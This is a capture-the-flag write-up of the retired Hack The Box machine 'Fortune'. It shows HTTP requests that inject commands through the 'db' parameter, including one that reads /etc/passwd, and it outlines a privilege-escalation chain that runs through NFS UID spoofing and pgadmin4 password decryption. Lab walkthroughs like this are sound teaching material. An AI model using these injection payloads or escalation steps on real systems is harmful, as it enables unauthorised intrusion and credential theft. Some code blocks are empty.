### TL;DR 
There might not necessarily be anything "new" in this box if you've done all of the previous ones, but it's my absolute personal favorite. Thank you so much <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a> for creating it. I was so sad when it retired! üò¢
<p><br></p>

### Overview

The `Fortune` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a>) is a retired 50 point OpenBSD machine with some pretty interesting parts to it. If you have completed all of the previous boxes on HackTheBox, then `Fortune` should be pretty simple, as there is nothing particularly new introduced.
<p><br></p>

The box starts with simple web enumeration to locate RCE found in the site's `db` variable, which occurs when a semi colon (;) is appended to the end of the `db`. Next, some files are located via the RCE that can be used to create a PKCS12 certificate which permits access to port 443. From there, an SSH key is located to access the user called `nfsuser` and escalate to the user `charlie` by mounting a newly found nfs share and using `su` to access `charlie` with a local user that has the same UID. SSH keys for `charlie` are then used to access the user via SSH and enumerate further.
<p><br></p>

Finally, there is a `pgadmin4` database running on the box which contains hashes for the root password. A file called `crypto.py` is utilized for `pgadmin4's` encoding/decoding process, and can be used here to decode the root password and ultimately grab the flag.

### Nmap Scan

</code></pre></div></div>

So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting.

### Web Enumeration

Here's what I discovered upon navigating to `http://10.10.10.127/` in my browser:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-homepage.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

Hmm... 

Let's try capturing a request with `Burp Suite`!

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

db=fortunes
```

The `db` variable looks pretty spicy! üå∂Ô∏è

After running `wfuzz`, I discovered I could append a semi colon (;) to `db` and execute commands on the box, like so:

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

Content-Type: application/x-www-form-urlencoded

db=fortunes; id
```

And the response:
```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8

```

Nice! We have code execution. Let's have a look around to see what else we can find. 
<p><br></p>

### Enumerating Users & Obtaining User.txt

(Shortened output for readability):

```
db=fortunes;cat /etc/passwd

charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

Well, well, well... It would appear we have three different users here. They are `charlie`, `bob`, and `nfsuser`. Immediately, `nfsuser` appears interesting to me given the naming convention. The username `nfsuser` can easily be attributed to an `nfs share`! Now, this is great and all, but I still don't know how to access these users, nor am I able to add my own `ssh` keys..
